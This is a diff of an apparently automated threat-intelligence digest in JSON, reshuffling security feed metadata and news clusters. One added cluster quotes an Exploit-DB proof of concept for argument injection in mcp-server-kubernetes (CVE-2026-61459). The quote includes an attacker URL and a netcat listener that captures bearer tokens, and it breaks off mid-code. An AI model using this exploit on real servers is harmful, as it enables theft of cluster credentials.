@@ -1,13 +1,13 @@
 {
-  "generated_at": "2026-08-17T09:50:02.747423+00:00",
+  "generated_at": "2026-08-17T10:38:04.189280+00:00",
   "lookback_hours": 168,
   "lookback_human": "7 days",
   "total_feeds": 80,
-  "feeds_ok": 72,
-  "total_items_in_window": 279,
-  "total_clusters_raw": 125,
-  "total_clusters_in_packet": 67,
-  "dropped_low_score": 58,
+  "feeds_ok": 74,
+  "total_items_in_window": 305,
+  "total_clusters_raw": 142,
+  "total_clusters_in_packet": 72,
+  "dropped_low_score": 70,
   "dropped_overflow": 0,
   "cohort_metadata": {
     "threat_research_primary": {
@@ -81,12 +81,12 @@
       "item_count": 15,
       "in_window_count": 2
     },
-    "Trend Micro Research": {
-      "url": "https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787",
+    "SentinelOne Labs": {
+      "url": "https://www.sentinelone.com/labs/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 25,
-      "in_window_count": 0
+      "item_count": 10,
+      "in_window_count": 1
     },
     "Google Threat Analysis Group": {
       "url": "https://blog.google/threat-analysis-group/rss/",
@@ -102,6 +102,20 @@
       "item_count": 10,
       "in_window_count": 2
     },
+    "Trend Micro Research": {
+      "url": "https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 25,
+      "in_window_count": 0
+    },
+    "Check Point Research": {
+      "url": "https://research.checkpoint.com/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 3
+    },
     "Microsoft Threat Intelligence": {
       "url": "https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/",
       "cohort": "threat_research_primary",
@@ -116,12 +130,12 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Check Point Research": {
-      "url": "https://research.checkpoint.com/feed/",
+    "Kaspersky Securelist": {
+      "url": "https://securelist.com/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 15,
-      "in_window_count": 3
+      "item_count": 10,
+      "in_window_count": 4
     },
     "Citizen Lab": {
       "url": "https://citizenlab.ca/feed/",
@@ -137,19 +151,12 @@
       "item_count": 20,
       "in_window_count": 3
     },
-    "Kaspersky Securelist": {
-      "url": "https://securelist.com/feed/",
-      "cohort": "threat_research_primary",
+    "SANS Internet Storm Center": {
+      "url": "https://isc.sans.edu/rssfeed_full.xml",
+      "cohort": "government_authoritative",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 6
-    },
-    "SentinelOne Labs": {
-      "url": "https://www.sentinelone.com/labs/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 1
+      "in_window_count": 10
     },
     "Cisco Talos": {
       "url": "https://feeds.feedburner.com/feedburner/Talos",
@@ -158,26 +165,19 @@
       "item_count": 15,
       "in_window_count": 3
     },
+    "Volexity": {
+      "url": "https://www.volexity.com/feed/",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
+    },
     "ESET WeLiveSecurity": {
       "url": "https://www.welivesecurity.com/en/rss/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 100,
       "in_window_count": 3
-    },
-    "SANS Internet Storm Center": {
-      "url": "https://isc.sans.edu/rssfeed_full.xml",
-      "cohort": "government_authoritative",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 10
-    },
-    "Horizon3 Attack Research": {
-      "url": "https://horizon3.ai/feed/",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 4
     },
     "Recorded Future": {
       "url": "https://www.recordedfuture.com/feed",
@@ -186,12 +186,12 @@
       "item_count": 50,
       "in_window_count": 2
     },
-    "Volexity": {
-      "url": "https://www.volexity.com/feed/",
-      "cohort": "threat_research_primary",
+    "Horizon3 Attack Research": {
+      "url": "https://horizon3.ai/feed/",
+      "cohort": "offensive_vulnerability_research",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 0
+      "in_window_count": 4
     },
     "GitHub Security Lab": {
       "url": "https://github.blog/category/security/feed/",
@@ -200,13 +200,6 @@
       "item_count": 10,
       "in_window_count": 1
     },
-    "Red Canary": {
-      "url": "https://redcanary.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
-    },
     "PortSwigger Research": {
       "url": "https://portswigger.net/research/rss",
       "cohort": "offensive_vulnerability_research",
@@ -214,12 +207,19 @@
       "item_count": 40,
       "in_window_count": 0
     },
-    "The DFIR Report": {
-      "url": "https://thedfirreport.com/feed/",
+    "Red Canary": {
+      "url": "https://redcanary.com/feed/",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 0
+    },
+    "Exploit-DB": {
+      "url": "https://www.exploit-db.com/rss.xml",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 7
     },
     "watchTowr Labs": {
       "url": "https://labs.watchtowr.com/rss/",
@@ -228,16 +228,23 @@
       "item_count": 15,
       "in_window_count": 1
     },
-    "Assetnote": {
-      "url": "https://www.assetnote.io/resources/research/rss.xml",
-      "cohort": "offensive_vulnerability_research",
-      "status": "parse_error",
-      "item_count": 0,
+    "The DFIR Report": {
+      "url": "https://thedfirreport.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 10,
       "in_window_count": 0
     },
     "Black Hills Information Security": {
       "url": "https://www.blackhillsinfosec.com/feed/",
       "cohort": "detection_response_operations",
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
+    },
+    "Assetnote": {
+      "url": "https://www.assetnote.io/resources/research/rss.xml",
+      "cohort": "offensive_vulnerability_research",
       "status": "parse_error",
       "item_count": 0,
       "in_window_count": 0
@@ -263,13 +270,6 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Elastic Security Labs": {
-      "url": "https://www.elastic.co/security-labs/rss/feed.xml",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
-    },
     "Sophos X-Ops": {
       "url": "https://news.sophos.com/en-us/category/threat-research/feed/",
       "cohort": "detection_response_operations",
@@ -277,18 +277,18 @@
       "item_count": 15,
       "in_window_count": 2
     },
+    "Elastic Security Labs": {
+      "url": "https://www.elastic.co/security-labs/rss/feed.xml",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 1
+    },
     "SpecterOps": {
       "url": "https://medium.com/feed/specter-ops-posts",
       "cohort": "detection_response_operations",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 0
-    },
-    "Datadog Security Labs": {
-      "url": "https://securitylabs.datadoghq.com/rss/feed.xml",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 30,
       "in_window_count": 0
     },
     "Orca Security Research": {
@@ -298,11 +298,11 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Google Cloud Threat Intelligence": {
-      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
-      "cohort": "threat_research_primary",
+    "Datadog Security Labs": {
+      "url": "https://securitylabs.datadoghq.com/rss/feed.xml",
+      "cohort": "cloud_identity_infrastructure",
       "status": "ok",
-      "item_count": 20,
+      "item_count": 30,
       "in_window_count": 0
     },
     "AWS Security Blog": {
@@ -333,12 +333,33 @@
       "item_count": 20,
       "in_window_count": 6
     },
-    "Exploit-DB": {
-      "url": "https://www.exploit-db.com/rss.xml",
-      "cohort": "offensive_vulnerability_research",
+    "Google Cloud Threat Intelligence": {
+      "url": "https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 0
+    },
+    "Cloudflare Security": {
+      "url": "https://blog.cloudflare.com/tag/security/rss/",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 0
+    },
+    "Protect AI": {
+      "url": "https://protectai.com/blog/rss.xml",
+      "cohort": "ai_security_agentic_risk",
       "status": "parse_error",
       "item_count": 0,
       "in_window_count": 0
+    },
+    "Cloudflare Radar": {
+      "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 2
     },
     "Trail of Bits": {
       "url": "https://blog.trailofbits.com/feed/",
@@ -354,19 +375,12 @@
       "item_count": 100,
       "in_window_count": 2
     },
-    "Protect AI": {
-      "url": "https://protectai.com/blog/rss.xml",
+    "Google DeepMind Blog": {
+      "url": "https://deepmind.google/blog/rss.xml",
       "cohort": "ai_security_agentic_risk",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
-    },
-    "Cloudflare Security": {
-      "url": "https://blog.cloudflare.com/tag/security/rss/",
-      "cohort": "cloud_identity_infrastructure",
       "status": "ok",
-      "item_count": 20,
-      "in_window_count": 0
+      "item_count": 100,
+      "in_window_count": 2
     },
     "Wiz Research": {
       "url": "https://www.wiz.io/feed/rss.xml",
@@ -382,18 +396,11 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Cloudflare Radar": {
-      "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
-      "cohort": "cloud_identity_infrastructure",
+    "Chainalysis": {
+      "url": "https://www.chainalysis.com/blog/feed/",
+      "cohort": "ransomware_ecrime_financial_crime",
       "status": "ok",
-      "item_count": 20,
-      "in_window_count": 2
-    },
-    "Google DeepMind Blog": {
-      "url": "https://deepmind.google/blog/rss.xml",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 100,
+      "item_count": 10,
       "in_window_count": 2
     },
     "OpenSSF Blog": {
@@ -403,19 +410,12 @@
       "item_count": 10,
       "in_window_count": 3
     },
-    "Chainalysis": {
-      "url": "https://www.chainalysis.com/blog/feed/",
-      "cohort": "ransomware_ecrime_financial_crime",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 2
-    },
-    "Dark Reading": {
-      "url": "https://www.darkreading.com/rss.xml",
+    "The Record": {
+      "url": "https://therecord.media/feed",
       "cohort": "cyber_news_breach_reporting",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
+      "status": "ok",
+      "item_count": 5,
+      "in_window_count": 5
     },
     "BleepingComputer": {
       "url": "https://www.bleepingcomputer.com/feed/",
@@ -424,26 +424,12 @@
       "item_count": 15,
       "in_window_count": 15
     },
-    "The Record": {
-      "url": "https://therecord.media/feed",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 5,
-      "in_window_count": 5
-    },
     "Interconnects": {
       "url": "https://www.interconnects.ai/feed",
       "cohort": "ai_security_agentic_risk",
       "status": "ok",
       "item_count": 20,
       "in_window_count": 3
-    },
-    "Google Cloud Security": {
-      "url": "https://cloudblog.withgoogle.com/rss/",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 11
     },
     "SecurityWeek": {
       "url": "https://www.securityweek.com/feed/",
@@ -452,19 +438,12 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "CyberScoop": {
-      "url": "https://cyberscoop.com/feed/",
-      "cohort": "cyber_news_breach_reporting",
+    "Google Cloud Security": {
+      "url": "https://cloudblog.withgoogle.com/rss/",
+      "cohort": "cloud_identity_infrastructure",
       "status": "ok",
-      "item_count": 10,
-      "in_window_count": 10
-    },
-    "Help Net Security": {
-      "url": "https://www.helpnetsecurity.com/feed/",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 10
+      "item_count": 20,
+      "in_window_count": 11
     },
     "AI Snake Oil": {
       "url": "https://www.aisnakeoil.com/feed",
@@ -480,6 +459,27 @@
       "item_count": 100,
       "in_window_count": 1
     },
+    "CyberScoop": {
+      "url": "https://cyberscoop.com/feed/",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 10
+    },
+    "Dark Reading": {
+      "url": "https://www.darkreading.com/rss.xml",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 21
+    },
+    "Help Net Security": {
+      "url": "https://www.helpnetsecurity.com/feed/",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 10
+    },
     "Simon Willison": {
       "url": "https://simonwillison.net/atom/everything/",
       "cohort": "ai_security_agentic_risk",
@@ -493,6 +493,13 @@
       "status": "ok",
       "item_count": 10,
       "in_window_count": 8
+    },
+    "Krebs on Security": {
+      "url": "https://krebsonsecurity.com/feed/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 2
     },
     "Troy Hunt": {
       "url": "https://www.troyhunt.com/rss/",
@@ -508,20 +515,6 @@
       "item_count": 100,
       "in_window_count": 1
     },
-    "Reddit r/cybersecurity": {
-      "url": "https://www.reddit.com/r/cybersecurity/.rss",
-      "cohort": "reddit_practitioner_osint",
-      "status": "ok",
-      "item_count": 0,
-      "in_window_count": 0
-    },
-    "Krebs on Security": {
-      "url": "https://krebsonsecurity.com/feed/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 2
-    },
     "Reddit r/blueteamsec": {
       "url": "https://www.reddit.com/r/blueteamsec/.rss",
       "cohort": "reddit_practitioner_osint",
@@ -529,8 +522,8 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Reddit r/sysadmin": {
-      "url": "https://www.reddit.com/r/sysadmin/.rss",
+    "Reddit r/cybersecurity": {
+      "url": "https://www.reddit.com/r/cybersecurity/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 0,
@@ -543,15 +536,8 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Graham Cluley": {
-      "url": "https://grahamcluley.com/feed/",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 2
-    },
-    "Reddit r/netsecstudents": {
-      "url": "https://www.reddit.com/r/netsecstudents/.rss",
+    "Reddit r/sysadmin": {
+      "url": "https://www.reddit.com/r/sysadmin/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 0,
@@ -564,12 +550,19 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Infosecurity Magazine": {
-      "url": "https://www.infosecurity-magazine.com/rss/news/",
-      "cohort": "cyber_news_breach_reporting",
+    "Reddit r/netsecstudents": {
+      "url": "https://www.reddit.com/r/netsecstudents/.rss",
+      "cohort": "reddit_practitioner_osint",
       "status": "ok",
-      "item_count": 100,
-      "in_window_count": 29
+      "item_count": 0,
+      "in_window_count": 0
+    },
+    "Graham Cluley": {
+      "url": "https://grahamcluley.com/feed/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 2
     },
     "The Hacker News": {
       "url": "https://feeds.feedburner.com/TheHackersNews",
@@ -585,25 +578,32 @@
       "item_count": 100,
       "in_window_count": 1
     },
+    "Infosecurity Magazine": {
+      "url": "https://www.infosecurity-magazine.com/rss/news/",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 28
+    },
     "Reddit r/netsec": {
       "url": "https://www.reddit.com/r/netsec/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 25,
-      "in_window_count": 16
-    },
-    "Embrace the Red": {
-      "url": "https://embracethered.com/blog/index.xml",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 1
+      "in_window_count": 17
     },
     "tl;dr sec": {
       "url": "https://tldrsec.com/feed.xml",
       "cohort": "practitioner_analysis",
       "status": "ok",
       "item_count": 20,
+      "in_window_count": 1
+    },
+    "Embrace the Red": {
+      "url": "https://embracethered.com/blog/index.xml",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 100,
       "in_window_count": 1
     },
     "Risky Business News": {
@@ -2189,260 +2189,6 @@
       ]
     },
     {
-      "cluster_id": "e3235a03c3",
-      "priority_score": 16,
-      "member_count": 7,
-      "corroborating_source_count": 5,
-      "strong_signals": [
-        "Apple iOS/macOS"
-      ],
-      "taxonomy": {
-        "threat_categories": [
-          "credential_theft",
-          "data_breach",
-          "ransomware_extortion",
-          "zero_day"
-        ],
-        "actor_attribution": [
-          "Rhysida"
-        ],
-        "affected_industries": [
-          "financial_services",
-          "government"
-        ],
-        "affected_products": [
-          "Apple iOS/macOS",
-          "Microsoft Defender"
-        ],
-        "tools_used": [],
-        "cve_ids": [
-          "CVE-2026-33825",
-          "CVE-2026-50751",
-          "CVE-2026-50752"
-        ],
-        "attack_techniques": [],
-        "urgency_signals": [
-          "no_patch_yet",
-          "zero_day"
-        ],
-        "content_type": [
-          "news_report",
-          "vulnerability_disclosure"
-        ],
-        "confidence_tier": [
-          "tier_1_primary_research",
-          "tier_3_analysis",
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "Kaspersky Securelist",
-        "cohort": "threat_research_primary",
-        "title": "IT threat evolution in Q2 2026. Non-mobile statistics",
-        "link": "https://securelist.com/malware-report-q2-2026-pc-iot-statistics/120960/",
-        "published": "2026-08-10T10:00:37+00:00",
-        "summary": "The report presents key trends and statistics on malware that targeted personal computers running Windows and macOS, as well as internet of things (IoT) devices, during Q2 2026.",
-        "full_body": "Table of Contents Quarterly figures Ransomware Quarterly trends and highlights Threat actor disruption Vulnerabilities and attacks The most prolific groups Number of new ransomware variants Number of users attacked by ransomware Trojans TOP 10 countries and territories attacked by ransomware Trojans TOP 10 most common families of ransomware Trojans Miners Number of new miner variants Number of users attacked by miners TOP 10 countries and territories attacked by miners Attacks on macOS Quarterly highlights TOP 20 threats to macOS TOP 10 countries and territories by share of attacked users IoT threat statistics TOP 10 threats delivered to IoT devices Attacks on IoT honeypots Attacks via web resources TOP 10 countries and territories that served as sources of web-based attacks Countries and territories where users faced the greatest risk of online infection Local threats Countries and territories where users faced the highest risk of local infection Authors AMR IT threat evolution in Q2 2026. Non-mobile statistics IT threat evolution in Q2 2026. Mobile statistics The statistics in this report are based on detection verdicts returned by Kaspersky products unless otherwise stated. The information was provided by Kaspersky users who consented to sharing statistical data. Quarterly figures In Q2 2026: Kaspersky products blocked nearly 400 million attacks that originated with various online resources. Web Anti-Virus responded to 52 million unique links. File Anti-Virus blocked more than 16 million malicious and potentially unwanted objects. There were 2538 new ransomware variants discovered. More than 71,000 users experienced ransomware attacks. 15% of all ransomware victims whose data was published on threat actors’ data leak sites (DLS) were attacked by Qilin. More than 213,000 users were targeted by miners. Ransomware Quarterly trends and highlights Threat actor disruption Microsoft has dismantled an illicit malware-signing service used by ransomware operators. Microsoft’s Digital Crimes Unit has shut down a malware-signing-as-a-service (MSaaS) operation run by the threat group Fox Tempest. The illicit service abused the Microsoft Artifact Signing platform to generate digital signature certificates for malicious software. Malware signed by these certificates was observed in campaigns conducted by such ransomware groups as Rhysida, Akira, INC, Qilin, and BlackByte. The service was also leveraged by operators of the Oyster loader as well as the Lumma and Vidar infostealers. To disrupt the operation, Microsoft seized the domain used by the MSaaS platform, revoked all associated certificates, and disabled the related accounts. Additionally, the company filed a lawsuit against Fox Tempest. Vulnerabilities and attacks CISA has confirmed that a Windows vulnerability known as BlueHammer is actively being exploited in ransomware attacks. On April 22, the agency updated its Known Exploited Vulnerabilities (KEV) catalog to note the ongoing ransomware exploitation of CVE-2026-33825. The local privilege escalation flaw in Microsoft Defender was originally disclosed earlier in April. Although Microsoft released a fix on April 14, unpatched systems remain vulnerable. CISA did not disclose further details or attribute the attacks to specific threat groups. Check Point has linked zero-day exploitation of CVE-2026-50751 to the Qilin ransomware group. The critical vulnerability affects Check Point Remote Access VPN and Mobile Access. Attackers began exploiting the flaw as a zero-day on May 7, with activity spiking sharply in early June. While several dozen organizations have been targeted, at least one incident has been definitively tied to Qilin. Check Point also disclosed a related certificate validation flaw (CVE-2026-50752) that affects site-to-site VPN connections relying on the legacy IKEv1 key exchange protocol. Researchers assess with high confidence that the PayoutsKing group is leveraging the legitimate QEMU emulator to deploy hidden, Alpi",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "ransomware_extortion",
-            "zero_day",
-            "data_breach"
-          ],
-          "actor_attribution": [
-            "Rhysida"
-          ],
-          "affected_industries": [],
-          "affected_products": [
-            "Apple iOS/macOS",
-            "Microsoft Defender"
-          ],
-          "tools_used": [],
-          "cve_ids": [
-            "CVE-2026-33825",
-            "CVE-2026-50751",
-            "CVE-2026-50752"
-          ],
-          "attack_techniques": [],
-          "urgency_signals": [
-            "zero_day",
-            "no_patch_yet"
-          ],
-          "content_type": "news_report",
-          "confidence_tier": "tier_1_primary_research",
-          "role_map": {
-            "Apple iOS/macOS": "target",
-            "Microsoft Defender": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Kaspersky Securelist",
-          "cohort": "threat_research_primary",
-          "title": "IT threat evolution in Q2 2026. Non-mobile statistics",
-          "link": "https://securelist.com/malware-report-q2-2026-pc-iot-statistics/120960/",
-          "published": "2026-08-10T10:00:37+00:00",
-          "summary": "The report presents key trends and statistics on malware that targeted personal computers running Windows and macOS, as well as internet of things (IoT) devices, during Q2 2026.",
-          "taxonomy": {
-            "threat_categories": [
-              "ransomware_extortion",
-              "zero_day",
-              "data_breach"
-            ],
-            "actor_attribution": [
-              "Rhysida"
-            ],
-            "affected_industries": [],
-            "affected_products": [
-              "Apple iOS/macOS",
-              "Microsoft Defender"
-            ],
-            "tools_used": [],
-            "cve_ids": [
-              "CVE-2026-33825",
-              "CVE-2026-50751",
-              "CVE-2026-50752"
-            ],
-            "attack_techniques": [],
-            "urgency_signals": [
-              "zero_day",
-              "no_patch_yet"
-            ],
-            "content_type": "news_report",
-            "confidence_tier": "tier_1_primary_research",
-            "role_map": {
-              "Apple iOS/macOS": "target",
-              "Microsoft Defender": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        },
-        {
-          "source": "SecurityWeek",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Recent macOS Screen Sharing Vulnerability Exploited in Attacks",
-          "link": "https://www.securityweek.com/recent-macos-screen-sharing-vulnerability-exploited-in-attacks/",
-          "published": "2026-08-17T08:47:38+00:00",
-          "summary": "Threat actors gained root access to the vulnerable systems and deployed a Monero miner. The post Recent macOS Screen Sharing Vulnerability Exploited in Attacks appeared first on SecurityWeek .",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "Apple iOS/macOS"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "vulnerability_disclosure",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "Apple iOS/macOS": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        },
-        {
-          "source": "BleepingComputer",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Hackers exploit macOS Screen Sharing flaw to deploy Monero miner",
-          "link": "https://www.bleepingcomputer.com/news/security/hackers-exploit-macos-screen-sharing-flaw-to-deploy-monero-miner/",
-          "published": "2026-08-14T14:59:55+00:00",
-          "summary": "The Netherlands' National Cyber Security Centre (NCSC) is warning that hackers are actively exploiting a macOS authentication bypass vulnerability after public exploit code emerged. [...]",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "Apple iOS/macOS"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "Apple iOS/macOS": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        },
-        {
-          "source": "Risky Business News",
-          "cohort": "practitioner_analysis",
-          "title": "Risky Bulletin: US will let private companies carry out offensive cyber ops",
-          "link": "https://risky.biz/RBNEWS600/",
-          "published": "2026-08-14T04:37:40+00:00",
-          "summary": "The White House will let private companies carry out offensive cyber ops, an AI hacking campaign breached Taiwan’s government, a macOS bug was exploited over the internet to drop cryptominers, and Kenya orders internet cafes to store logs.",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [
-              "government"
-            ],
-            "affected_products": [
-              "Apple iOS/macOS"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_3_analysis",
-            "role_map": {
-              "Apple iOS/macOS": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        },
-        {
-          "source": "Infosecurity Magazine",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Novel macOS Infostealer AmnesiaStealer Spread via ClickFix",
-          "link": "https://www.infosecurity-magazine.com/news/macos-infostealer-spread-clickfix/",
-          "published": "2026-08-14T10:45:00+00:00",
-          "summary": "AmnesiaStealer contains novel functions, including the attackers gaining remote control over the victim’s browser to steal cookie data",
-          "taxonomy": {
-            "threat_categories": [
-              "credential_theft"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "Apple iOS/macOS"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "Apple iOS/macOS": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "86f975510e",
       "priority_score": 16,
       "member_count": 4,
@@ -2955,6 +2701,147 @@
       ]
     },
     {
+      "cluster_id": "c9f01215de",
+      "priority_score": 16,
+      "member_count": 2,
+      "corroborating_source_count": 2,
+      "strong_signals": [
+        "Kubernetes"
+      ],
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [
+          "Anthropic/Claude",
+          "GitHub",
+          "Kubernetes"
+        ],
+        "tools_used": [],
+        "cve_ids": [
+          "CVE-2026-61459"
+        ],
+        "attack_techniques": [],
+        "urgency_signals": [
+          "critical_cvss",
+          "poc_available"
+        ],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_offensive_research",
+          "tier_2_operator"
+        ]
+      },
+      "primary": {
+        "source": "Exploit-DB",
+        "cohort": "offensive_vulnerability_research",
+        "title": "[remote] mcp-server-kubernetes 3.8.x - Argument Injection",
+        "link": "https://www.exploit-db.com/exploits/52638",
+        "published": "2026-08-11T00:00:00+00:00",
+        "summary": "mcp-server-kubernetes 3.8.x - Argument Injection",
+        "full_body": "Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training mcp-server-kubernetes 3.8.x - Argument Injection EDB-ID: 52638 CVE: 2026-61459 EDB Verified: Author: banyamer Type: remote Exploit: / Platform: Multiple Date: 2026-08-11 Vulnerable App: #!/usr/bin/env python3 # Exploit Title: mcp-server-kubernetes 3.8.x - Argument Injection # CVE: CVE-2026-61459 # Date: 2026-07-13 # Exploit Author: Mohammed Idrees Banyamer # Author Country: Jordan # Instagram: @banyamer_security # Author GitHub: https://github.com/mbanyamer # Author Blog : https://banyamersecurity.com/blog/ # Vendor Homepage: https://github.com/Flux159/mcp-server-kubernetes # Software Link: https://github.com/Flux159/mcp-server-kubernetes # Affected: mcp-server-kubernetes < 3.9.0 # Tested on: mcp-server-kubernetes <= 3.8.x # Category: Remote # Platform: Linux # Exploit Type: Argument Injection # CVSS: 9.3 # Description: Argument injection via resourceType/name parameters in kubectl_get, kubectl_describe, and kubectl_delete tools allowing --server flag injection and bearer token exfiltration. # Fixed in: 3.9.0 # Usage: # python3 exploit.py # # Examples: # python3 exploit.py --target http://localhost:8080 --attacker http://attacker:6443 # # Options: # --target MCP Server URL (JSON-RPC endpoint) # --attacker Attacker-controlled Kubernetes API server URL # # Notes: # • Requires access to call MCP tools (e.g. via Claude Desktop / Cursor / custom client) # • Listener on attacker server (nc -lvnp 6443) will capture Authorization header with bearer token # # How to Use # # Step 1: # Start listener: nc -lvnp 6443 # # Step 2: # Run exploit with attacker URL def banner(): print(r\"\"\" ╔██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗╗ ║██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██║ ║██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ██████╔╝ ║██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗ ║██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝ ╔═╗ Banyamer Security ╔═╗ \"\"\") import requests import json import argparse import sys def main(): banner() parser = argparse.ArgumentParser(description=\"CVE-2026-61459 PoC - MCP Server Kubernetes Argument Injection\") parser.add_argument(\"--target\", required=True, help=\"MCP Server JSON-RPC endpoint URL (e.g. http://localhost:8080/mcp)\") parser.add_argument(\"--attacker\", required=True, help=\"Attacker Kubernetes API server URL (e.g. 